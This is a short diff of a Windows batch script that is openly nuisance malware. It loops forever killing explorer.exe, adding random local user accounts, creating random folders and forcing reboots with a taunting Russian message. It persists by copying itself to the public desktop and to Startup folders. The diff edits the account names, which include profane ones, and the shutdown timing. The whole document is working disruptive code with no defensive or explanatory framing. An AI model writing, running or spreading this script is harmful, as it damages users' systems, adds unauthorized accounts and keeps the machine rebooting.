@@ -1,17 +1,14 @@
+chcp 1251
 @echo off
 :a
 color 02
 taskkill /IM explorer.exe /f
-net user %random% DEATH /add
-net user "Гандон" DEATH /add
-net user FuckYou DEATH /add
-net user CON DEATH /add
-net user SinXyuni DEATH /add
+net user %random% LOLH /add
 md %random% %random% %random% %random% %random%
 md %random% %random% %random% %random% %random%
 md %random% %random% %random% %random% %random%
 md %random% %random% %random% %random% %random%
-shutdown /r /t 7 
+shutdown /r /t 25 /c "А ты как думал, первая работа можно меня обыграть?" 
 copy %0 "C:\Users\Public\Desktop"
 copy %0 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 copy %0 "C:\Documents and Settings\All Users\Windows\Start Menu\Programs\Startup"
